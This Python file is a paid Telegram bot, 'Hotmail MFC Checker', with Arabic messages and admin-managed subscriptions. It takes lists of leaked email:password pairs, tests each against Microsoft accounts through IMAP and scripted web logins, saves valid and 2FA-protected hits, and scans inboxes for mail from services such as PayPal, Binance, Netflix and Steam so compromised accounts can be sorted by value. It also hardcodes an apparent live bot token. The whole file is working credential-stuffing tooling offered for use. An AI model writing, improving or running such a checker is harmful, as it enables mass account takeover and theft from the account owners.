#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Hotmail MFC Checker Telegram Bot
Created by: @TTT9KK
Bot version with User Activation System
"""

import os
import sys
import io
import time
import json
import uuid
import datetime
import requests
import threading
import concurrent.futures
from pathlib import Path
from threading import Lock, Semaphore
import random
import re
import logging

# Telegram Bot imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters
)

# Configuration
MY_SIGNATURE = "@TTT9KK"
TELEGRAM_CHANNEL = "https://t.me/TTT9KK"
ADMIN_IDS = [6043225431]  # آيدي المشرف

# Files
USERS_FILE = "users_data.json"
COMBOS_DIR = "combos"
RESULTS_DIR = "results"

# Create directories
os.makedirs(COMBOS_DIR, exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global counters
lock = threading.Lock()
user_stats = {}
rate_limit_semaphore = Semaphore(500)

# Service definitions
services = {
    # Social Media
    "Facebook": {"sender": "security@facebookmail.com", "file": "Hits_Facebook.txt"},
    "Instagram": {"sender": "security@mail.instagram.com", "file": "Hits_Instagram.txt"},
    "TikTok": {"sender": "register@account.tiktok.com", "file": "Hits_TikTok.txt"},
    "Twitter": {"sender": "info@x.com", "file": "Hits_Twitter.txt"},
    "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "Hits_LinkedIn.txt"},
    "Pinterest": {"sender": "no-reply@pinterest.com", "file": "Hits_Pinterest.txt"},
    "Reddit": {"sender": "noreply@reddit.com", "file": "Hits_Reddit.txt"},
    "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "file": "Hits_Snapchat.txt"},
    
    # Streaming
    "Netflix": {"sender": "info@account.netflix.com", "file": "Hits_Netflix.txt"},
    "Spotify": {"sender": "no-reply@spotify.com", "file": "Hits_Spotify.txt"},
    "Twitch": {"sender": "no-reply@twitch.tv", "file": "Hits_Twitch.txt"},
    "YouTube": {"sender": "no-reply@youtube.com", "file": "Hits_YouTube.txt"},
    "Disney+": {"sender": "no-reply@disneyplus.com", "file": "Hits_DisneyPlus.txt"},
    
    # Gaming
    "Steam": {"sender": "noreply@steampowered.com", "file": "Hits_Steam.txt"},
    "Epic Games": {"sender": "help@epicgames.com", "file": "Hits_EpicGames.txt"},
    "PlayStation": {"sender": "Sony_Computer_Entertainment@playstationmail.com", "file": "Hits_PlayStation.txt"},
    "Xbox": {"sender": "xbox@email.xbox.com", "file": "Hits_Xbox.txt"},
    
    # Finance
    "PayPal": {"sender": "service@paypal.com.br", "file": "Hits_PayPal.txt"},
    "Binance": {"sender": "do-not-reply@ses.binance.com", "file": "Hits_Binance.txt"},
    "Coinbase": {"sender": "no-reply@coinbase.com", "file": "Hits_Coinbase.txt"},
}

# ==================== USER MANAGEMENT ====================

class UserManager:
    def __init__(self):
        self.users = self.load_users()
    
    def load_users(self):
        """Load users from JSON file"""
        if os.path.exists(USERS_FILE):
            try:
                with open(USERS_FILE, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def save_users(self):
        """Save users to JSON file"""
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(self.users, f, indent=4, ensure_ascii=False)
    
    def add_user(self, user_id, duration_type, duration_value):
        """Add or update user activation"""
        user_id = str(user_id)
        now = datetime.datetime.now()
        
        if duration_type == "hour":
            expire_date = now + datetime.timedelta(hours=duration_value)
        elif duration_type == "day":
            expire_date = now + datetime.timedelta(days=duration_value)
        elif duration_type == "month":
            expire_date = now + datetime.timedelta(days=duration_value * 30)
        elif duration_type == "year":
            expire_date = now + datetime.timedelta(days=duration_value * 365)
        else:
            return False
        
        self.users[user_id] = {
            "activated_at": now.isoformat(),
            "expires_at": expire_date.isoformat(),
            "duration_type": duration_type,
            "duration_value": duration_value,
            "total_checks": 0,
            "total_hits": 0
        }
        self.save_users()
        return True
    
    def is_active(self, user_id):
        """Check if user is active"""
        user_id = str(user_id)
        
        # Admin always active
        if int(user_id) in ADMIN_IDS:
            return True
        
        if user_id not in self.users:
            return False
        
        expire_date = datetime.datetime.fromisoformat(self.users[user_id]["expires_at"])
        return datetime.datetime.now() < expire_date
    
    def get_user_info(self, user_id):
        """Get user information"""
        user_id = str(user_id)
        if user_id not in self.users:
            return None
        return self.users[user_id]
    
    def remove_user(self, user_id):
        """Remove user activation"""
        user_id = str(user_id)
        if user_id in self.users:
            del self.users[user_id]
            self.save_users()
            return True
        return False
    
    def get_all_users(self):
        """Get all users"""
        return self.users
    
    def update_stats(self, user_id, hits=0, checks=0):
        """Update user statistics"""
        user_id = str(user_id)
        if user_id in self.users:
            self.users[user_id]["total_hits"] += hits
            self.users[user_id]["total_checks"] += checks
            self.save_users()

# Initialize user manager
user_manager = UserManager()

# ==================== HOTMAIL CHECKER ====================

def get_hotmail_token(email, password):
    """Enhanced Multi-Method Checker"""
    
    # Method 1: Try IMAP First (Most Reliable)
    try:
        import imaplib
        mail = imaplib.IMAP4_SSL('outlook.office365.com', 993, timeout=10)
        mail.login(email, password)
        mail.select('INBOX')
        mail.logout()
        return "VALID_IMAP", "success"
    except imaplib.IMAP4.error as e:
        error = str(e).lower()
        if 'authenticate' in error or 'login' in error or 'invalid' in error:
            pass  # Try next method
        else:
            return None, "bad"
    except:
        pass  # Try next method
    
    # Method 2: Web Login (Fallback)
    try:
        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml',
        }
        
        r = session.get('https://login.live.com/', headers=headers, timeout=10)
        ppft = re.search(r'name="PPFT".*?value="(.*?)"', r.text)
        url_post = re.search(r'urlPost:\'(.*?)\'', r.text)
        
        if ppft:
            data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': ppft.group(1),
            }
            
            post_url = url_post.group(1) if url_post else 'https://login.live.com/ppsecure/post.srf'
            r2 = session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=15)
            
            url = r2.url.lower()
            text = r2.text.lower()
            
            if 'account.live.com' in url or 'outlook.live.com' in url:
                return "VALID_WEB", "success"
            
            if 'verify' in text or 'help us protect' in text:
                return "VALID_2FA", "2fa_required"
            
            if 'locked' in text or 'abuse' in url:
                return None, "locked"
    except:
        pass
    
    # If all methods fail
    return None, "bad"

def check_via_imap(email, password):
    """Standalone IMAP check"""
    try:
        import imaplib
        mail = imaplib.IMAP4_SSL('outlook.office365.com', 993, timeout=10)
        mail.login(email, password)
        mail.logout()
        return "valid_via_imap", "success"
    except:
        return None, "bad"

def check_emails_for_services(token, email, selected_services=None):
    """Check inbox for service registrations"""
    if not token or token == "valid_no_token":
        return {}
    
    try:
        headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        # Get emails from inbox
        response = requests.get(
            "https://outlook.office.com/api/v2.0/me/messages?$top=100",
            headers=headers,
            timeout=20
        )
        
        if response.status_code != 200:
            return {}
        
        data = response.json()
        found_services = {}
        
        # Check each service
        services_to_check = selected_services if selected_services else services.keys()
        
        for service_name in services_to_check:
            service_data = services[service_name]
            sender_email = service_data["sender"]
            
            # Check if any email is from this service
            for message in data.get("value", []):
                sender = message.get("From", {}).get("EmailAddress", {}).get("Address", "")
                if sender_email.lower() in sender.lower():
                    found_services[service_name] = True
                    break
        
        return found_services
        
    except Exception as e:
        logger.error(f"Error checking emails: {e}")
        return {}

def check_account(email, password, user_id, selected_services=None):
    """Check single account with enhanced detection and logging"""
    result = {
        "email": email,
        "password": password,
        "status": "bad",
        "services": {},
        "message": ""
    }
    
    try:
        # Get token with multiple methods
        token, status = get_hotmail_token(email, password)
        
        if status == "success":
            result["status"] = "hit"
            result["message"] = f"✅ Valid ({token})"
            
            # Log the hit
            logger.info(f"HIT FOUND: {email}:{password}")
            
            # Check for services
            if token and "VALID" in str(token):
                try:
                    services_found = check_emails_for_services(token, email, selected_services)
                    result["services"] = services_found
                    
                    if services_found:
                        result["message"] += f" | 🎯 {len(services_found)} services"
                except Exception as e:
                    logger.error(f"Error checking services for {email}: {e}")
            
            # Update stats
            user_manager.update_stats(user_id, hits=1, checks=1)
            
        elif status == "2fa_required":
            result["status"] = "2fa_required"
            result["message"] = "🔐 Valid - 2FA Required"
            logger.info(f"2FA ACCOUNT: {email}:{password}")
            user_manager.update_stats(user_id, hits=1, checks=1)
            
        elif status == "locked":
            result["status"] = "locked"
            result["message"] = "🔒 Account Locked"
            user_manager.update_stats(user_id, checks=1)
            
        elif status == "timeout":
            result["status"] = "retry"
            result["message"] = "⏱️ Timeout"
            
        elif status == "connection_error":
            result["status"] = "retry"
            result["message"] = "🔌 Connection Error"
            
        else:
            result["status"] = "bad"
            result["message"] = "❌ Invalid"
            user_manager.update_stats(user_id, checks=1)
    
    except Exception as e:
        logger.error(f"Error checking {email}: {e}")
        result["status"] = "error"
        result["message"] = f"❌ Error: {str(e)}"
    
    return result

# ==================== BOT HANDLERS ====================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    user = update.effective_user
    user_id = user.id
    
    welcome_text = f"""
🎯 <b>مرحباً بك في Hotmail MFC Checker Bot</b>

👤 الآيدي الخاص بك: <code>{user_id}</code>

📋 <b>الأوامر المتاحة:</b>
/start - عرض هذه الرسالة
/check - بدء فحص الحسابات
/status - عرض حالة الاشتراك
/stats - عرض الإحصائيات
/help - المساعدة

💎 <b>تم التطوير بواسطة:</b> {MY_SIGNATURE}
🔗 <b>القناة:</b> {TELEGRAM_CHANNEL}
    """
    
    keyboard = [
        [InlineKeyboardButton("🚀 بدء الفحص", callback_data="start_check")],
        [InlineKeyboardButton("📊 حالة الاشتراك", callback_data="my_status")],
        [InlineKeyboardButton("📢 القناة", url=TELEGRAM_CHANNEL)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check user activation status"""
    user_id = update.effective_user.id
    
    if user_id in ADMIN_IDS:
        status_text = """
👑 <b>أنت مشرف (Admin)</b>

✅ لديك صلاحيات غير محدودة
⏰ الاشتراك: دائم
        """
    elif user_manager.is_active(user_id):
        user_info = user_manager.get_user_info(user_id)
        expire_date = datetime.datetime.fromisoformat(user_info["expires_at"])
        remaining = expire_date - datetime.datetime.now()
        
        status_text = f"""
✅ <b>حسابك مفعّل</b>

📅 تاريخ التفعيل: {user_info["activated_at"][:10]}
⏰ ينتهي في: {expire_date.strftime("%Y-%m-%d %H:%M")}
⏳ الوقت المتبقي: {remaining.days} يوم و {remaining.seconds // 3600} ساعة

📊 <b>الإحصائيات:</b>
• عمليات الفحص: {user_info["total_checks"]}
• الحسابات الصحيحة: {user_info["total_hits"]}
        """
    else:
        status_text = f"""
❌ <b>حسابك غير مفعّل</b>

👤 آيديك: <code>{user_id}</code>

📞 للحصول على اشتراك، تواصل مع المطور:
{MY_SIGNATURE}
        """
    
    await update.message.reply_text(status_text, parse_mode='HTML')

async def activate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Activate user (Admin only)"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ هذا الأمر للمشرفين فقط!")
        return
    
    # Parse command: /activate USER_ID DURATION_VALUE DURATION_TYPE
    # Example: /activate 123456789 5 hour
    # Example: /activate 123456789 30 day
    # Example: /activate 123456789 1 month
    # Example: /activate 123456789 1 year
    
    args = context.args
    if len(args) != 3:
        help_text = """
<b>استخدام الأمر:</b>
<code>/activate USER_ID DURATION_VALUE DURATION_TYPE</code>

<b>أمثلة:</b>
• <code>/activate 123456789 5 hour</code> - 5 ساعات
• <code>/activate 123456789 7 day</code> - 7 أيام
• <code>/activate 123456789 1 month</code> - شهر واحد
• <code>/activate 123456789 1 year</code> - سنة واحدة

<b>أنواع المدة المتاحة:</b>
• hour - ساعة
• day - يوم
• month - شهر
• year - سنة
        """
        await update.message.reply_text(help_text, parse_mode='HTML')
        return
    
    try:
        target_user_id = int(args[0])
        duration_value = int(args[1])
        duration_type = args[2].lower()
        
        if duration_type not in ["hour", "day", "month", "year"]:
            await update.message.reply_text("❌ نوع المدة غير صحيح! استخدم: hour, day, month, year")
            return
        
        if user_manager.add_user(target_user_id, duration_type, duration_value):
            # Arabic duration names
            duration_names = {
                "hour": "ساعة",
                "day": "يوم",
                "month": "شهر",
                "year": "سنة"
            }
            
            success_text = f"""
✅ <b>تم تفعيل المستخدم بنجاح!</b>

👤 آيدي المستخدم: <code>{target_user_id}</code>
⏰ المدة: {duration_value} {duration_names[duration_type]}
📅 تاريخ الانتهاء: {user_manager.get_user_info(target_user_id)["expires_at"][:16]}
            """
            await update.message.reply_text(success_text, parse_mode='HTML')
            
            # Notify the user
            try:
                notify_text = f"""
🎉 <b>تم تفعيل حسابك!</b>

⏰ المدة: {duration_value} {duration_names[duration_type]}
📅 ينتهي في: {user_manager.get_user_info(target_user_id)["expires_at"][:16]}

يمكنك الآن استخدام البوت!
استخدم /check للبدء
                """
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=notify_text,
                    parse_mode='HTML'
                )
            except:
                pass
        else:
            await update.message.reply_text("❌ فشل تفعيل المستخدم!")
            
    except ValueError:
        await update.message.reply_text("❌ صيغة الأمر غير صحيحة!")
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ: {str(e)}")

async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove user activation (Admin only)"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ هذا الأمر للمشرفين فقط!")
        return
    
    args = context.args
    if len(args) != 1:
        await update.message.reply_text(
            "<b>استخدام الأمر:</b>\n<code>/remove USER_ID</code>",
            parse_mode='HTML'
        )
        return
    
    try:
        target_user_id = int(args[0])
        
        if user_manager.remove_user(target_user_id):
            await update.message.reply_text(
                f"✅ تم إلغاء تفعيل المستخدم: <code>{target_user_id}</code>",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text("❌ المستخدم غير موجود!")
            
    except ValueError:
        await update.message.reply_text("❌ آيدي المستخدم غير صحيح!")
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ: {str(e)}")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all users (Admin only)"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ هذا الأمر للمشرفين فقط!")
        return
    
    all_users = user_manager.get_all_users()
    
    if not all_users:
        await update.message.reply_text("📭 لا يوجد مستخدمين مفعّلين حالياً")
        return
    
    users_text = "<b>📋 قائمة المستخدمين المفعّلين:</b>\n\n"
    
    for uid, info in all_users.items():
        expire_date = datetime.datetime.fromisoformat(info["expires_at"])
        is_active = datetime.datetime.now() < expire_date
        status = "✅" if is_active else "❌"
        
        users_text += f"{status} <code>{uid}</code>\n"
        users_text += f"   ⏰ ينتهي: {expire_date.strftime('%Y-%m-%d %H:%M')}\n"
        users_text += f"   📊 فحوصات: {info['total_checks']} | نجاحات: {info['total_hits']}\n\n"
    
    await update.message.reply_text(users_text, parse_mode='HTML')

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start checking process"""
    user_id = update.effective_user.id
    
    # Check if user is active
    if not user_manager.is_active(user_id):
        await update.message.reply_text(
            f"""
❌ <b>حسابك غير مفعّل!</b>

👤 آيديك: <code>{user_id}</code>

للحصول على اشتراك، تواصل مع المطور:
{MY_SIGNATURE}
            """,
            parse_mode='HTML'
        )
        return
    
    await update.message.reply_text(
        """
📤 <b>أرسل ملف الكومبو الآن</b>

الصيغة المطلوبة:
<code>email:password</code>

مثال:
<code>user@hotmail.com:password123
test@outlook.com:pass456</code>
        """,
        parse_mode='HTML'
    )
    
    # Set user state
    context.user_data['waiting_for_combo'] = True

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle combo file upload"""
    user_id = update.effective_user.id
    
    # Check if user is active
    if not user_manager.is_active(user_id):
        await update.message.reply_text("❌ حسابك غير مفعّل!")
        return
    
    # Check if waiting for combo
    if not context.user_data.get('waiting_for_combo'):
        await update.message.reply_text("استخدم /check أولاً للبدء")
        return
    
    # Download file
    file = await update.message.document.get_file()
    file_path = os.path.join(COMBOS_DIR, f"{user_id}_{int(time.time())}.txt")
    await file.download_to_drive(file_path)
    
    # Read combos
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line]
        
        total_combos = len(lines)
        
        if total_combos == 0:
            await update.message.reply_text("❌ الملف فارغ أو بصيغة خاطئة!")
            os.remove(file_path)
            return
        
        # Ask for service selection
        keyboard = [
            [InlineKeyboardButton("✅ جميع الخدمات", callback_data=f"scan_all_{file_path}")],
            [InlineKeyboardButton("🎯 خدمة محددة", callback_data=f"scan_select_{file_path}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"""
✅ <b>تم استلام الملف</b>

📊 عدد الحسابات: {total_combos}

اختر نوع الفحص:
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        
        context.user_data['waiting_for_combo'] = False
        
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ في قراءة الملف: {str(e)}")
        if os.path.exists(file_path):
            os.remove(file_path)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = query.from_user.id
    
    if data == "start_check":
        if not user_manager.is_active(user_id):
            await query.edit_message_text(
                f"❌ حسابك غير مفعّل!\n\nآيديك: <code>{user_id}</code>",
                parse_mode='HTML'
            )
            return
        
        await query.edit_message_text(
            """
📤 <b>أرسل ملف الكومبو الآن</b>

الصيغة المطلوبة:
<code>email:password</code>
            """,
            parse_mode='HTML'
        )
        context.user_data['waiting_for_combo'] = True
    
    elif data == "my_status":
        if user_id in ADMIN_IDS:
            status_text = "👑 <b>أنت مشرف (Admin)</b>\n\n✅ صلاحيات غير محدودة"
        elif user_manager.is_active(user_id):
            user_info = user_manager.get_user_info(user_id)
            expire_date = datetime.datetime.fromisoformat(user_info["expires_at"])
            status_text = f"""
✅ <b>حسابك مفعّل</b>

⏰ ينتهي في: {expire_date.strftime("%Y-%m-%d %H:%M")}
📊 فحوصات: {user_info["total_checks"]}
🎯 نجاحات: {user_info["total_hits"]}
            """
        else:
            status_text = f"❌ حسابك غير مفعّل!\n\nآيديك: <code>{user_id}</code>"
        
        await query.edit_message_text(status_text, parse_mode='HTML')
    
    elif data.startswith("scan_"):
        parts = data.split("_", 2)
        scan_type = parts[1]
        file_path = parts[2]
        
        if not os.path.exists(file_path):
            await query.edit_message_text("❌ الملف غير موجود!")
            return
        
        # Read combos
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line]
        
        # Start scanning
        await query.edit_message_text(
            f"""
🚀 <b>جاري بدء الفحص...</b>

📊 عدد الحسابات: {len(lines)}
⏰ الوضع: {scan_type}

⏳ الرجاء الانتظار...
            """,
            parse_mode='HTML'
        )
        
        # Process in background
        await process_combos(query, context, file_path, lines, scan_type)

async def process_combos(query, context, file_path, lines, scan_type):
    """Process combo list with improved speed and accuracy"""
    user_id = query.from_user.id
    
    # Initialize stats
    stats = {
        "hit": 0,
        "bad": 0,
        "retry": 0,
        "locked": 0,
        "2fa": 0,
        "processed": 0,
        "total": len(lines),
        "services_found": {}
    }
    
    # Results directory
    result_dir = os.path.join(RESULTS_DIR, f"{user_id}_{int(time.time())}")
    os.makedirs(result_dir, exist_ok=True)
    
    # Status message
    status_msg = await context.bot.send_message(
        chat_id=user_id,
        text="⏳ جاري الفحص...",
        parse_mode='HTML'
    )
    
    # Process combos with rate limiting
    for i, line in enumerate(lines):
        if ':' not in line:
            continue
        
        parts = line.split(':', 1)
        email = parts[0].strip()
        password = parts[1].strip()
        
        # Small delay to avoid rate limiting (0.3-0.5 seconds)
        time.sleep(random.uniform(0.3, 0.5))
        
        # Check account
        result = check_account(email, password, user_id)
        
        stats["processed"] += 1
        
        if result["status"] == "hit":
            stats["hit"] += 1
            
            # Save hit
            hit_file = os.path.join(result_dir, "Hits_All.txt")
            with open(hit_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | {result['message']}\n")
            
            # Save per service
            for service_name in result["services"].keys():
                stats["services_found"][service_name] = stats["services_found"].get(service_name, 0) + 1
                
                service_file = os.path.join(result_dir, services[service_name]["file"])
                with open(service_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")
        
        elif result["status"] == "bad":
            stats["bad"] += 1
        elif result["status"] == "locked":
            stats["locked"] += 1
        elif result["status"] == "2fa_required":
            stats["2fa"] += 1
            stats["hit"] += 1  # 2FA means valid account
            
            # Save 2FA accounts
            twofa_file = os.path.join(result_dir, "Hits_2FA.txt")
            with open(twofa_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | Requires 2FA\n")
        elif result["status"] == "retry":
            stats["retry"] += 1
        
        # Update progress every 5 accounts or at milestones
        if (i + 1) % 5 == 0 or (i + 1) == stats["total"] or (i + 1) % 100 == 0:
            progress = (stats["processed"] / stats["total"]) * 100
            
            # Calculate estimated time remaining
            if stats["processed"] > 0:
                avg_time_per_check = (time.time() - int(result_dir.split('_')[-1])) / stats["processed"]
                remaining = (stats["total"] - stats["processed"]) * avg_time_per_check
                eta_minutes = int(remaining / 60)
                eta_seconds = int(remaining % 60)
                eta_text = f"\n⏱️ الوقت المتبقي: ~{eta_minutes}د {eta_seconds}ث"
            else:
                eta_text = ""
            
            progress_text = f"""
⏳ <b>جاري الفحص...</b>

📊 التقدم: {stats["processed"]}/{stats["total"]} ({progress:.1f}%)
{eta_text}

✅ صحيح: {stats["hit"]}
❌ خاطئ: {stats["bad"]}
🔒 مقفل: {stats["locked"]}
🔐 2FA: {stats["2fa"]}
🔄 إعادة: {stats["retry"]}
            """
            
            try:
                await status_msg.edit_text(progress_text, parse_mode='HTML')
            except:
                pass
    
    # Final results
    final_text = f"""
✅ <b>اكتمل الفحص!</b>

📊 <b>النتائج النهائية:</b>
• الإجمالي: {stats["total"]}
• صحيح: {stats["hit"]}
• خاطئ: {stats["bad"]}
• مقفل: {stats["locked"]}
• 2FA مطلوب: {stats["2fa"]}
• إعادة: {stats["retry"]}

🎯 <b>الخدمات المكتشفة: {len(stats["services_found"])}</b>
    """
    
    if stats["services_found"]:
        final_text += "\n"
        for service, count in sorted(stats["services_found"].items(), key=lambda x: x[1], reverse=True)[:10]:
            final_text += f"• {service}: {count}\n"
    
    await status_msg.edit_text(final_text, parse_mode='HTML')
    
    # Send result files
    if stats["hit"] > 0:
        for filename in os.listdir(result_dir):
            file_path_result = os.path.join(result_dir, filename)
            
            try:
                await context.bot.send_document(
                    chat_id=user_id,
                    document=open(file_path_result, 'rb'),
                    caption=f"📄 {filename}\n\n💎 {MY_SIGNATURE}"
                )
                time.sleep(0.5)  # Delay between file sends
            except:
                pass
    
    # Cleanup
    try:
        os.remove(file_path)
    except:
        pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = """
📚 <b>دليل استخدام البوت</b>

<b>الأوامر الأساسية:</b>
/start - بدء البوت
/check - فحص الحسابات
/status - حالة الاشتراك
/stats - الإحصائيات
/help - المساعدة

<b>أوامر الإدارة (للمشرفين فقط):</b>
/activate - تفعيل مستخدم
/remove - إلغاء تفعيل مستخدم
/users - عرض جميع المستخدمين

<b>أمثلة التفعيل:</b>
<code>/activate 123456789 5 hour</code> - 5 ساعات
<code>/activate 123456789 7 day</code> - 7 أيام
<code>/activate 123456789 1 month</code> - شهر
<code>/activate 123456789 1 year</code> - سنة

💎 المطور: {MY_SIGNATURE}
    """
    
    await update.message.reply_text(help_text, parse_mode='HTML')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user statistics"""
    user_id = update.effective_user.id
    
    if not user_manager.is_active(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ حسابك غير مفعّل!")
        return
    
    user_info = user_manager.get_user_info(user_id)
    
    if user_id in ADMIN_IDS and not user_info:
        stats_text = """
👑 <b>إحصائيات المشرف</b>

✅ صلاحيات غير محدودة
📊 لا توجد إحصائيات بعد
        """
    elif user_info:
        stats_text = f"""
📊 <b>إحصائياتك</b>

📈 عمليات الفحص: {user_info["total_checks"]}
✅ الحسابات الصحيحة: {user_info["total_hits"]}
📉 نسبة النجاح: {(user_info["total_hits"] / user_info["total_checks"] * 100) if user_info["total_checks"] > 0 else 0:.1f}%
        """
    else:
        stats_text = "📊 لا توجد إحصائيات بعد"
    
    await update.message.reply_text(stats_text, parse_mode='HTML')

# ==================== MAIN ====================

def main():
    """Start the bot"""
    # Read bot token from config or environment
    BOT_TOKEN = "8547504648:AAFxnC95YMUp9gJlxzypGh8NDu2f-7MTxeg"  # توكن البوت
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("activate", activate_command))
    application.add_handler(CommandHandler("remove", remove_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Start bot
    print("🚀 البوت يعمل الآن...")
    print(f"💎 المطور: {MY_SIGNATURE}")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n⚠️ تم إيقاف البوت")
    except Exception as e:
        print(f"❌ خطأ: {e}")
